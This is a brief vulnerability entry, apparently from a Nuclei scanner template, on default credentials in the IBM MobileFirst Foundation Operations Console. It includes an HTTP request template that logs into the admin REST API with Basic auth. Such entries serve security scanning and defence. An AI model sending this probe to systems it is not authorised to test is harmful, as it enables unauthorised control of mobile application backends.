# Vulnerability: IBM MobileFirst Foundation - Default Credentials
**Classification:** CWE-798
**Source:** Nuclei Template (`ibm-mfp-default-login.yaml`)

## Description
Detected IBM MobileFirst Foundation Operations Console was found using default credentials. The administration REST API exposes full control over mobile application backends including adapter management, push notification infrastructure, OAuth security configuration, and application authenticity enforcement.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /mfpadmin/management-apis/2.0/runtimes HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}
Accept: application/json
```

